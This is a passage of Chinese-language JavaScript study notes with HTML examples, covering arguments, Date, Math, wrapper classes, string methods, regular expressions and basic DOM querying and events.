在调用函数时,浏览器每次都会传递两个隐含参数 1.函数的上下文,this 2.封装实参的arguments - arguments是一个&quot;类&quot;数组对象,它可以通过索引来操作数据,也可以获取长度 - 在调用函数时,我们所传递的实参都会封装到arguments中保存 - arguments.length获取实参的长度,表示传递实参的数目 - 即使不定义形参,也可以通过arguments来使用实参,只是比较麻烦 arguments[0]为第一个实参,依次类推,与定义形参与否无关 - arguments中有一个属性叫callee, - 这个属性对应一个函数对象,就是当前正在执行的函数的对象 */ function fun() &#123; // 检查一个变量是否是数组 console.log(arguments instanceof Array); // false console.log(Array.isArray(arguments));// false console.log(arguments.length); console.log(arguments[0]); console.log(arguments.callee == fun); // &#125; fun(2, 3, 4, 4); // 4j &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 081 Date对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Date对象&lt;/title&gt; &lt;script&gt; /* Date对象 - 在JS中使用Date对象来表示一个时间 - 如果直接使用构造函数创建一个Date对象,则会封装为当前代码执行的时间 - 创建一个指定的时间对象,需要在构造函数中传递一个表示时间的字符串作为参数 mm/dd/yyyy hh:mm:ss */ // 创建Date对象 var d = new Date(); console.log(d); // Sat Oct 09 2021 21:56:49 GMT+0800 // 创建一个指定的时间对象 var d2 = new Date(&quot;10/11/2021 23:11:11&quot;); console.log(d2);// Sun Oct 10 2021 23:11:11 GMT+0800 /* getDate() - 获取当前日期对象是几日 */ var date = d2.getDate(); console.log(&quot;date = &quot; + date); /* getDay() - 获取当前日期对象是周几（返回周日0 周一1 周二2 周三3 周四4 周五5 周六6） */ var day = d2.getDay(); console.log(&quot;day = &quot; + day); /* getMonth() - 获取当前时间对象的月份 - 返回一个0-11的值 0表示月份 1表示2月 …… 11表示12月份 */ var month = d2.getMonth(); console.log(month); // 返回准确月份需要+1 /* getFullYear() - 获取当前日期对象的年份 - getYear()废弃 */ var year = d2.getFullYear(); console.log(year); /* getHours() getMinutes() getSeconds() getMillseconds() getTime() - 获取当前时间对象的时间戳 - 时间戳timestamp：格林威治标准时间的1970年1月1日0时0分0秒，到当前日期时间所花费的毫秒数 - 1s = 1000ms - 计算机顶层在保存时间时，使用的都是时间戳 */ var d3 = new Date(&quot;1/1/1970 0:0:0&quot;); console.log(d3.getTime()); // -28800000，误差原因：因为该时间是北京时间，北京时间与格林威治时间有差别 // 获取当前时间戳 Date.now() // 可以利用当前时间戳来测试代码执行性能，达到console.time()和console.timeEnd()的效果 var startTtime = Date.now(); /* 测试代码块 */ var endTime = Date.now(); console.log(startTtime - endTime); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 082 Math对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Math对象&lt;/title&gt; &lt;script&gt; /* Math - Math和其他的对象不同，不是一个构造函数 它属于一个工具类，不用创建对象，里面封装了数学相关的属性和方法 */ console.log(Math); // Math &#123;abs: ƒ, acos: ƒ, acosh: ƒ, asin: ƒ, asinh: ƒ, …&#125; /* Math对象属性 E 返回算数常数e，即自然对数的底数（约等于2.718） LN2 返回2的自然对数（约等于0.693） LN10 返回2的自然对数（约等于2.302） LOG2E 返回以2为底的e的对数（约等于1.414） LOG10E 返回以10为底的e的对数（约等于0.434） PI 返回圆周率（约等于3.14159） SQRT1_2 返回2的平方根的倒数（约等于0.707） SORT2 返回2的平方根（约等于1.414） */ /* Math.abs()计算一个数的绝对值 Math.ceil() 对一个数进行向上取整，小数位有值就向上进1 Math.floor() 对一个数进行向下取整，小数位部分会被舍弃 相比parseInt()来说，效率高得多，但是处理不了&quot;123px&quot;这种类似的字符串 Math.round() 对数字进行四舍五入取整 Math.random() - 可以用来生成一个0-1之间的随机数，(0,1)开区间 - */ console.log(Math.abs(-1)); console.log(Math.ceil(1.0001)); // 2 console.log(Math.ceil(-1.0001)); // -1 console.log(Math.floor(1.99999)); // 1 console.log(Math.floor(-1.99999)); // -2 console.log(Math.floor(&quot;1.99&quot;)); // -1 console.log(Math.floor(&quot;1.99px&quot;)); // NaN // 生成 0-10 之间的随机数 console.log(Math.round(Math.random() * 10)); // 生成 1-10 之间的随机数 console.log(Math.round(Math.random() * 9) + 1); console.log(Math.ceil(Math.random() * 10)); /* 生成一个x到y之间的随机数 Math.round(Math.random() * (y - x)) + x Math.floor(Math.random() * (y - x + 1)) + x */ console.log(Math.ceil(Math.random() * 10 + 90)); /* 返回多个值中的最值， max(x,y) min(x,y) */ console.log(Math.max(1, 3, 64, 545, 545, 45545, 1)); /* Math.pow(x,y) 返回x的y次幂 Math.sqrt(x) 返回x的平方根 */ console.log(Math.pow(2, 3)); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 083 包装类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;包装类&lt;/title&gt; &lt;script&gt; /* 基本数据类型 String Number Boolean Undefined Null 引用数据类型 Object 在Js中为我们提供了包装类，通过包装类，可以将基本数据类型转换为对象 String - 可以将基本数据类型字符串转换为String对象 Boolean - 可以将基本数据类型的布尔值转换为布尔值 Number - 可以将基本数据类型的数字转换为Number对象 注意：我们在实际开发过程中，基本不会使用基本数据类型的对象 如果使用基本数据类型的对象，在做一些比较的时候可能会带来一些不可预料的后果 */ // 创建一个Number类型的对象 var num = new Number(3); console.log(num); // Number &#123;3&#125; console.log(typeof num); // object var str = new String(&quot;你好&quot;); console.log(str); console.log(typeof str); var bool = new Boolean(true); console.log(bool); console.log(typeof bool); num.hello = &quot;abcdefghijklmnopqrstuvwxyz&quot;; console.log(num); // &#123;3, hello: &#x27;abcdefghijklmnopqrstuvwxyz&#x27;&#125; var num2 = new Number(3); console.log(num == num2); // false var bool2 = true; console.log(bool == bool2); // true console.log(bool === bool2); // false // 自动进行了类型转换，而对象转换为布尔值都是true var b = new Boolean(false); if (b) &#123;// 成功执行 console.log(&quot;执行&quot;); &#125; /* 方法和属性只能添加给对象，不能添加给基本数据类型 当我们对一些基本数据类型调用属性和方法，浏览器会临时使用包装类将其转换为对象，然后再调用对象的属性和方法 调用完成后，再将其转换为基本数据类型 由此说明：可以通过基本数据类型直接调用对象的方法 */ var b = 1234; b = b.toString(); console.log(b); b.hello = &quot;你好&quot;; /* 此处由基本数据类型转换为对象，添加hello给对象1，但是添加完毕后，对象1就被销毁了；读取b的hello属性，先将基本数据类型转换为对象2，然后寻找hello属性，但是对象2中没有hello属性，所以返回undefined */ console.log(b.hello); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 084 字符串的方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;字符串方法&lt;/title&gt; &lt;script&gt; var str = &quot;Hello&quot;; /* 在底层字符串是以数组的形式保存的 [&quot;H&quot;;&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;] */ console.log(str.length); console.log(str[0]); // H /* length属性 - 可以用来获取字符串的长度 charAt() - 可以返回字符串中指定位置的字符 - 根据索引获取指定的字符 - 和[]获取类似 charCodeAt() - 返回指定位置的Unicode编码 fromCharCode() - 可以根据字符编码获取字符 concat() - 用于连接两个或多个字符串 - 不会影响原字符串 - 作用和+号相同 indexOf() - 该方法可以检索一个字符串中是否含有指定的内容 - 如果含有该字符串，返回其第一次出现的位置 如果没有找到指定的内容，返回-1 - 可以使用第二参数指定开始检索位置 lastIndexOf() - 该方法的用法和IndexOf()一样 不同的是，indexOf是从前往后检索 lastIndexOf是从后往前检索 - 也可以指定开始检索位置 */ var zero = str.charAt(0); console.log(zero); // H zero = str.charCodeAt(0); console.log(zero); // 72 var result = String.fromCharCode(12036);// 也可以使用十六进制0x13234 console.log(result); // 乙 result = str.concat(&quot;张加林&quot;, &quot;zl&quot;); console.log(result); // Hello张加林zl result = str.indexOf(&quot;l&quot;); console.log(result); // 2 result = str.indexOf(&quot;l&quot;, 3); console.log(result); // 3 result = str.lastIndexOf(&quot;l&quot;); console.log(result); // 3 /* match() replace() search() 三者用于正则表达式部分 slice() - 可以用于从字符串中截取指定的内容 - 不会影响原字符串，而是将截取到的内容返回 - 参数： 第一个参数，开始位置的索引（包括开始位置） 第二个参数，结束位置的索引（不包括结束位置） - 如果省略，则会截取到后面所有的字符串 - 也可以传递一个负数作为参数，负数的话会从后边计算 substring() - 可以用来截取一个字符串，与slice()类似 - 参数： 第一个参数，开始位置的索引（包括开始位置） 第二个参数，结束位置的索引（不包括结束位置） - 不同的是，substring()不能接收负值作为参数，如果传递负值，则默认使用0 - 而且会自动调整参数的位置，如果第二个参数小于第一个，则自动交换 substr() - 用来截取字符串 - 参数： 1.截取开始位置的索引 2.截取的长度 small()/big() 用于把字符串显示为大号 / 小号字体 toLocaleLowerCase()/toLocaleUpperCase() 不会改变原字符串，针对地区 toLowerCase()/toUpperCase() 不会改变原字符串 toSource() 返回对象的源代码 toString() split() - 可以将一个字符串拆分为一个数组 - 参数： - 需要一个字符串作为参数，将会根据该字符串拆分数组拆分符号会被删除 - 传递一个空串作为参数，则会将每个字符都拆分为数组中的一个元素 valueOf() 可返回 String 对象的原始值，通常由 JavaScript 在后台自动进行调用，而不是显式地处于代码中 */ result = str.slice(0, 2); console.log(result); // He result = str.slice(2, -1); console.log(result); // ll result = str.substring(1, 2); console.log(result); // e result = str.substring(1, 0); console.log(result); // H result = str.substr(3, 2); console.log(result, str); var str2 = &quot;aadf,sdf,fdsafds,fsdsgffg,gdsf&quot;; result = str2.split(&quot;,&quot;); console.log(result); // [&#x27;aadf&#x27;, &#x27;sdf&#x27;, &#x27;fdsafds&#x27;, &#x27;fsdsgffg&#x27;, &#x27;gdsf&#x27;] console.log(Array.isArray(result)); // true console.log(str.toLocaleUpperCase()); // HELLO &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 085 正则表达式简介123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;正则表达式简介&lt;/title&gt; &lt;script&gt; /* 正则表达式用于定义一些字符串规则： 计算机可以根据正则表达式，来检查一个字符串是否符合规则， 获取将字符串中符合规则的内容提取出来 语法： var reg = new RegExp(&quot;正则表达式&quot;,&quot;匹配模式&quot;); 使用typeof检查正则表达式，将会返回object 正则表达式方法： - test() - 使用该方法可以检查一个字符串是否符合正则表达式规则 符合返回true，否则返回false；严格区分大小写 构造函数中可以传递一个匹配模式作为第二参数 可以是 - i 忽略大小写 - g 全局匹配模式 */ var str = &quot;bab&quot;; var reg = new RegExp(&quot;a&quot;); console.log(reg); console.log(typeof reg); // object console.log(reg.test(str)); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 086 正则语法12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;正则语法&lt;/title&gt; &lt;script&gt; /* 使用字面量创建正则表达式 语法：var 变量 = /正则表达式/匹配模式 使用字面量创建正则表达式更加简单，使用构造函数创建更加灵活（可以传入变量） */ // var reg = new RegExp(&quot;a&quot;,&quot;i&quot;); var reg = /a/i; console.log(typeof reg); // object console.log(reg.test(&quot;abc&quot;)); // true // 创建一个正则表达式来判断一个字符串中是否有a或b或c /* 使用|来表示或者的意思 */ reg = /a | b | c/i; console.log(reg.test(&quot;miketaylor&quot;)); // true // 创建一个正则表达式判断字符串中是否有字母 /* []里的内容也是或的关系 [a-z] [A-Z] [0-9] */ reg = /[a-z]/i; console.log(reg.test(&quot;3105085561&quot;)); //false /* [^ ]除了 */ reg = /[^ab]/i; console.log(reg.test(&quot;abababABBA&quot;)); // false &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 087 字符串和正则相关的方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;字符串和正则相关的方法&lt;/title&gt; &lt;script&gt; /* search() - 搜索字符串是否含有指定字符串 - 如果搜索到指定内容返回第一次出现的索引；没有搜索到返回-1 - 可以接收一个正则表达式作为参数，然后根据正则表达式去检索字符串 - search()只会查找第一个，即使设置全局匹配也没用 match() - 可以根据正则表达式，从一个字符串中，将符合条件的内容提取出来 - 默认情况下我们的match只会找到第一个符合要求的内容，找到以后就停止检索；为此我没可以设正则表达式为全局匹配模式，这样就会匹配到所有内容 可以为一个正则表达式设置多个匹配模式，且顺序无所谓 - match()会将匹配到的内容封装到一个数组中，即使只返回一个结果 - 默认情况下，我们的match()只会找到第一个符合条件的内容，找到以后就会停止检索，所以我们可以设置正则表达式为全局匹配模式，这样就可以匹配到所有的内容 - 可以为一个正则表达式设置多个匹配模式，且顺序无所谓 replace() - 可以将字符串中指定内容替换为新的内容 - 参数： 1.被替换的内容，可以接收一个正则表达式作为参数 2.新的内容 - 默认只会替换第一个，可以设置全局匹配模式 split() - 根据一个规则将一个字符串拆分为一个数组 - 方法中可以传递一个正则表达式作为参数去拆分字符串 - 该方法即使不指定全局匹配模式，也会全都拆分 */ var str = &#x27;das1fdsa4d2gsfds1af2gdd2sdgfdsf&#x27;; var res = str.split(/[a-z]+/); console.log(res); str = &quot;abc adc abf adc alc apl afi aef&quot;; console.log(str.search(/a[de]c/)); console.log(str.match(/a[de]c/g)); res = str.replace(/a[de]c/g, &quot;@@@@@@&quot;); console.log(res); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 088 正则表达式语法12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;正则表达式语法&lt;/title&gt; &lt;script&gt; /* 量词： - 通过量词可以设置一个内容出现的次数 &#123;a,b&#125;：出现a次到b次之间 &#123;c&#125;：刚好出现c次 &#123;m,&#125;：m次以上 n+：匹配任何包含至少一个n的字符串 n*：匹配任何包含0个或多个的字符串 n?：匹配任何包含零个或一个的字符串 n$：匹配任何结尾为n的字符串 ^n：匹配任何开头为n的字符串 如果在正则表达式中同时使用^$，则要求字符串必须完全符合正则表达式 ?=n：匹配任何其后紧接字符串n的字符串 ?!n：匹配任何其后没有紧接指定字符串n的字符串 - 量词只对前面的一个内容起作用 原子组 */ &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 089 正则表达式语法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;正则表达式（二）&lt;/title&gt; &lt;script&gt; /* .：表示除换行符外的其他任何字符 可以使用转义字符\\ \\. 表示. \\\\ 表示\\ 注意：使用构造函数时，由于它的参数是一个字符串，而\\则需要使用\\\\来代替。例如，使用构造函数检查字符串是否含有.：new RegExp(&quot;\\\\.&quot;); \\w：英文字母数字下划线 \\W：英文字母数字下划线 \\d：任意数字 \\D：除了数字 \\s：任意一个空白字符匹配，如空格，制表符\\t，换行符\\n \\S：除了空白符外任意一个字符匹配 \\b：单词边界 \\B：除了单词边界 */ var reg = /\\./; console.log(reg); // /\\./ reg = /\\\\/; console.log(reg.test(&quot;b.\\\\&quot;)); // true，注意：字符串中的\\也需要进行转义 reg = new RegExp(&quot;\\.&quot;); console.log(reg); // /./ reg = new RegExp(&quot;\\\\.&quot;); console.log(reg); // /\\./ reg = /\\bchild\\b/; console.log(reg.test(&quot;hello children&quot;)); //false // 去除前后空格 var str = &quot; mike taylor &quot;; str = str.replace(/^\\s+/g, &quot;&quot;); str = str.replace(/\\s+$/g, &quot;&quot;); // str = str.replace(/^\\s+ | \\s+$/g, &quot;&quot;); console.log(str); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 090 邮件的正则1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;邮件正则&lt;/title&gt; &lt;script&gt; /* 规则： - 任意字母数字下划线 . 任意字母数字下划线 @ 任意字母数字. (com|edu|org|net……).cn */ var reg = /^\\w&#123;3,&#125;(\\.\\w+)*@[A-z0-9]+(\\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;$/; var str = &quot;3105085561@qq.com&quot;; console.log(reg.test(str)); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 091 DOM简介DOM树 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;DOM简介&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn&quot;&gt;我是一个按钮&lt;/button&gt; &lt;script&gt; /* DOM：全称Document Object Model文档对象模型 JS中通过DOM来对HTML文档进行操作。只要理解了DOM就可以随心所欲的操作WEB界面了。 文档：文档表示的是整个的HTML网页文档 对象：对象表示将网页中的每一个部分都转换为了一个对象（包括注释） 模型：使用模型来表示对象之间的关系，这样方便我们获取对象 */ /* 浏览器已经为我们提供了文档节点对象，这个对象是window的属性，可以直接在页面中使用，文档节点代表的是整个网页。 */ // console.log(document); // #document // 获取button对象 var btn = document.getElementById(&quot;btn&quot;); console.log(btn); // 修改按钮文字，innerHTML代表btn内部的button代码 btn.innerHTML = &quot;你好&quot;; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 092 事件简介 1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;事件的简介&lt;/title&gt;&lt;body&gt; &lt;!-- 我们可以在事件对应的属性中设置一些js代码，这样当事件被触发时，这些代码将会执行 --&gt; &lt;button id=&quot;miketaylor&quot; onclick=&quot;&quot;&gt;这是一个button&lt;/button&gt; &lt;script&gt; /* 事件，就是用户和浏览器之间的交互行为 比如：点击按钮、鼠标移动、关闭窗口…… */ // 获取按钮对象 var btn = document.getElementById(&quot;miketaylor&quot;); /* 可以为按钮对应的事件绑定处理函数的形式来响应事件 这样当事件被触发时，其对应的函数将会被调用 */ // 绑定一个单击事件 // 像这种单击事件绑定的函数，我们称为单击响应函数 console.log(btn); btn.onclick = function () &#123; console.log(&quot;按钮事件触发&quot;); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 093 文档的加载 因为浏览器在加载一个页面时，是按照自上而下的顺序加载的，读取到一行就运行一行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;文档的加载&lt;/title&gt; &lt;script&gt; /* 浏览器在加载一个页面时，是按照自上而下的顺序加载的，读取到一行就运行一行，如果将script标签写到页面的上边，在代码执行时，页面还没有加载，页面没有加载DOM对象也没有加载会导致无法获取DOM对象 */ /* onload事件会在整个页面加载完成后才触发 为window绑定一个onload事件 该事件对应的响应函数将会在页面加载完成后执行，这样可以确保我们的代码执行时所有的DOM对象已经加载完毕 */ window.onload = function () &#123; var btn = document.getElementById(&quot;miketaylor&quot;); console.log(btn); btn.onclick = function () &#123; console.log(&quot;按钮事件触发&quot;); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;miketaylor&quot; onclick=&quot;&quot;&gt;这是一个button&lt;/button&gt; &lt;!-- &lt;script&gt; /* 将js代码写到页面的下部就是为了，可以在页面加载完毕以后再执行js代码 性能相对写在onload中较好 */ /* 浏览器在加载一个页面时，是按照自上而下的顺序加载的，读取到一行就运行一行，如果将script标签写到页面的上边，在代码执行时，页面还没有加载 */ var btn = document.getElementById(&quot;miketaylor&quot;); console.log(btn); btn.onclick = function () &#123; console.log(&quot;按钮事件触发&quot;); &#125; &lt;/script&gt; --&gt;&lt;/body&gt;&lt;/html&gt; 094 DOM查询123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;DOM查询&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/css.css&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.onload = function () &#123; //为id为btn01的按钮绑定一个单击响应函数 var btn01 = document.getElementById(&quot;btn01&quot;); btn01.onclick = function () &#123; //查找#bj节点 var bj = document.getElementById(&quot;bj&quot;); //打印bj //innerHTML 通过这个属性可以获取到元素内部的html代码 alert(bj.innerHTML); &#125;; //为id为btn02的按钮绑定一个单击响应函数 var btn02 = document.getElementById(&quot;btn02&quot;); btn02.onclick = function () &#123; //查找所有li节点 //getElementsByTagName()可以根据标签名来获取一组元素节点对象 //这个方法会给我们返回一个类数组对象，所有查询到的元素都会封装到对象中 //即使查询到的元素只有一个，也会封装到数组中返回 var lis = document.getElementsByTagName(&quot;li&quot;); //打印lis //alert(lis.length); //变量lis for (var i = 0; i &lt; lis.length; i++) &#123; alert(lis[i].innerHTML); &#125; &#125;; //为id为btn03的按钮绑定一个单击响应函数 var btn03 = document.getElementById(&quot;btn03&quot;); btn03.onclick = function () &#123; //查找name=gender的所有节点 var inputs = document.getElementsByName(&quot;gender&quot;); //alert(inputs.length); for (var i = 0; i &lt; inputs.length; i++) &#123; /* * innerHTML用于获取元素内部的HTML代码的 * 对于自结束标签，这个属性没有意义 */ //alert(inputs[i].innerHTML); /* * 如果需要读取元素节点属性， * 直接使用 元素.属性名 * 例子：元素.id 元素.name 元素.value * 注意：class属性不能采用这种方式，读取class属性时需要使用 元素.className !!! */ alert(inputs[i].className); // alert(inputs[i].value); // alert(inputs[i].name); // alert(inputs[i].id); &#125; &#125;; //查找#city下所有li节点 //返回#city的所有子节点 //返回#phone的第一个子节点 //返回#bj的父节点 //返回#android的前一个兄弟节点 //读取#username的value属性值 //设置#username的value属性值 //返回#bj的文本值 &#125;; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;total&quot;&gt; &lt;div class=&quot;inner&quot;&gt; &lt;p&gt; 你喜欢哪个城市? &lt;/p&gt; &lt;ul id=&quot;city&quot;&gt; &lt;li id=&quot;bj&quot;&gt;北京&lt;/li&gt; &lt;li&gt;上海&lt;/li&gt; &lt;li&gt;东京&lt;/li&gt; &lt;li&gt;首尔&lt;/li&gt; &lt;/ul&gt; &lt;br&gt; &lt;br&gt; &lt;p&gt; 你喜欢哪款单机游戏? &lt;/p&gt; &lt;ul id=&quot;game&quot;&gt; &lt;li id=&quot;rl&quot;&gt;红警&lt;/li&gt; &lt;li&gt;实况&lt;/li&gt; &lt;li&gt;极品飞车&lt;/li&gt; &lt;li&gt;魔兽&lt;/li&gt; &lt;/ul&gt; &lt;br /&gt; &lt;br /&gt; &lt;p&gt; 你手机的操作系统是? &lt;/p&gt; &lt;ul id=&quot;phone&quot;&gt; &lt;li&gt;IOS&lt;/li&gt; &lt;li id=&quot;android&quot;&gt;Android&lt;/li&gt; &lt;li&gt;Windows Phone&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=&quot;inner&quot;&gt; gender: &lt;input class=&quot;hello&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;male&quot; /&gt; Male &lt;input class=&quot;hello&quot; type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;female&quot; /&gt; Female &lt;br&gt; &lt;br&gt; name: &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;username&quot; value=&quot;abcde&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;btnList&quot;&gt; &lt;div&gt;&lt;button id=&quot;btn01&quot;&gt;查找#bj节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn02&quot;&gt;查找所有li节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn03&quot;&gt;查找name=gender的所有节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn04&quot;&gt;查找#city下所有li节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn05&quot;&gt;返回#city的所有子节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn06&quot;&gt;返回#phone的第一个子节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn07&quot;&gt;返回#bj的父节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn08&quot;&gt;返回#android的前一个兄弟节点&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn09&quot;&gt;返回#username的value属性值&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn10&quot;&gt;设置#username的value属性值&lt;/button&gt;&lt;/div&gt; &lt;div&gt;&lt;button id=&quot;btn11&quot;&gt;返回#bj的文本值&lt;/button&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 095 图片切换练习1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=\\ , initial-scale=1.0&quot;&gt; &lt;title&gt;图片切换练习&lt;/title&gt; 